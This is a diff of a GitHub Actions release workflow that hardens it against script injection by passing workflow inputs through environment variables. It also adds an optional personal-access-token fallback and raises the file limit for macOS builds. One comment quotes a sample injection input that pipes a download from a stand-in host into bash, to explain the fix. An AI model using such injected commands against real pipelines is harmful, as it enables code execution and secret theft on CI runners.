@@ -93,24 +93,35 @@ jobs:
 
       - name: Determine release version
         id: version
+        # Untrusted ${{ }} expressions (a workflow_dispatch input is
+        # attacker-controllable free text) must never be spliced directly into
+        # a `run:` script — GitHub expands them before the shell sees the
+        # script, so an input like `x"; curl evil.sh | bash #` becomes literal
+        # shell code. Routing them through `env:` makes them plain data.
+        env:
+          CHECK_VERSION: ${{ needs.check-release.outputs.version }}
+          DISPATCH_VERSION: ${{ github.event.inputs.version }}
+          REF_NAME: ${{ github.ref_name }}
         run: |
-          if [ -n "${{ needs.check-release.outputs.version }}" ]; then
-            echo "tag=${{ needs.check-release.outputs.version }}" >> "$GITHUB_OUTPUT"
-          elif [ -n "${{ github.event.inputs.version }}" ]; then
-            echo "tag=${{ github.event.inputs.version }}" >> "$GITHUB_OUTPUT"
+          if [ -n "$CHECK_VERSION" ]; then
+            echo "tag=$CHECK_VERSION" >> "$GITHUB_OUTPUT"
+          elif [ -n "$DISPATCH_VERSION" ]; then
+            echo "tag=$DISPATCH_VERSION" >> "$GITHUB_OUTPUT"
           else
-            echo "tag=${{ github.ref_name }}" >> "$GITHUB_OUTPUT"
+            echo "tag=$REF_NAME" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Extract changelog for this version
+        env:
+          TAG: ${{ steps.version.outputs.tag }}
+          REPO: ${{ github.repository }}
         run: |
-          TAG="${{ steps.version.outputs.tag }}"
           BARE="${TAG#v}"
           awk "/^## \[${BARE}\]/{found=1; next} found && /^## \[/{exit} found{print}" RELEASE_NOTES.md \
             | sed '/^[[:space:]]*$/{ N; /^\n[[:space:]]*$/d }' > /tmp/release-notes.md || true
           if [ ! -s /tmp/release-notes.md ]; then
             printf "See [RELEASE_NOTES.md](https://github.com/%s/blob/main/RELEASE_NOTES.md) for full details.\n" \
-              "${{ github.repository }}" > /tmp/release-notes.md
+              "$REPO" > /tmp/release-notes.md
           fi
 
       - name: Publish release with changelog
@@ -122,7 +133,15 @@ jobs:
           draft: false
           prerelease: false
         env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # A PAT (not the default GITHUB_TOKEN) is required here so the tag this
+          # step creates actually triggers a new `push: tags` workflow run — GitHub
+          # suppresses workflow triggers for refs created via GITHUB_TOKEN to
+          # prevent infinite loops. Without RELEASE_PAT, the macOS/Linux/Windows
+          # build jobs below (gated on a tag-triggered run) never execute. Add a
+          # repo secret named RELEASE_PAT (classic PAT with the `repo` scope, or a
+          # fine-grained PAT with Contents: Read and write on this repo) to enable
+          # them; falls back to GITHUB_TOKEN so behavior is unchanged until then.
+          GITHUB_TOKEN: ${{ secrets.RELEASE_PAT || secrets.GITHUB_TOKEN }}
 
   # ────────────────────────────────────────────────────────────────────────────
   # Build Windows installer (.exe)
@@ -365,7 +384,13 @@ jobs:
 
       - name: Build macOS arm64 installer
         timeout-minutes: 20
-        run: npm run dist:mac:arm64
+        # asar packing is disabled (see electron-builder config), so electron-builder
+        # signs/copies every individual node_modules file rather than one archive.
+        # The runner's default open-file limit (~256) isn't enough for that many
+        # concurrent handles during signing and trips EMFILE — raise it first.
+        run: |
+          ulimit -n 10240
+          npm run dist:mac:arm64
         working-directory: electron
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
@@ -473,7 +498,11 @@ jobs:
 
       - name: Build macOS x64 installer
         timeout-minutes: 20
-        run: npm run dist:mac:x64
+        # See the arm64 job above: asar is disabled, so signing touches thousands
+        # of individual files and trips the runner's default EMFILE limit.
+        run: |
+          ulimit -n 10240
+          npm run dist:mac:x64
         working-directory: electron
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
